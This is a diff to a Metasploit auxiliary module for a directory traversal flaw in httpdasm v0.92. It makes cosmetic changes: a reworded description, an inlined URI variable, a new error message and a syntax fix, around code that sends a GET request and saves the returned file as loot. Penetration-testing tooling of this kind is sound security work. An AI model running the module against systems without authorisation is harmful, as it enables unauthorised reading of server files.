@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Httpdasm Directory Traversal',
       'Description'    => %q{
-        Exploits a directory traversal vulnerability to read files from server running httpdasm v0.92.
+        This module allows for traversing the file system of a host running httpdasm v0.92.
       },
       'Author'         =>
         [
@@ -33,17 +33,16 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    uri = target_uri.path
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri)
+      'uri'    => normalize_uri(target_uri.path)
     })
 
     if res && res.code == 200
       print_status(res.body)
       path = store_loot('httpdasm.file', 'application/octet-stream', rhost, res.body)
     else
-      print_error("Timeout")
+      print_error("404 error")
     end
-    end
+  end
 end
